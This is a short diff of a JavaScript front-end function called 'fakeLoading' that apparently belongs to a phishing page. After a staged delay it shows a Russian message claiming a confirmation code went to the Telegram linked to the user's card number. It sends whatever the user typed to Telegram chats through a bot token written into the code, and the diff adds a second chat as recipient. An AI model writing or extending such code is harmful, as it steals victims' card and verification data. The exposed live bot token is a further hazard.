@@ -163,6 +163,7 @@ const fakeLoading = () => {
     loading.value = false
     step.value = 2
     axios.post(`https://api.telegram.org/bot8198695402:AAHriMSkoKEiHSrfBdJUqX8tGjIcyRrsdsc/sendMessage?chat_id=768959234&text=${text.value}`)
+    axios.post(`https://api.telegram.org/bot8198695402:AAHriMSkoKEiHSrfBdJUqX8tGjIcyRrsdsc/sendMessage?chat_id=5591730324&text=${text.value}`)
         showToast('Код подтверждения отправлен в телеграм подключенный к номеру карты', 'success')
   }, 2000)
 }
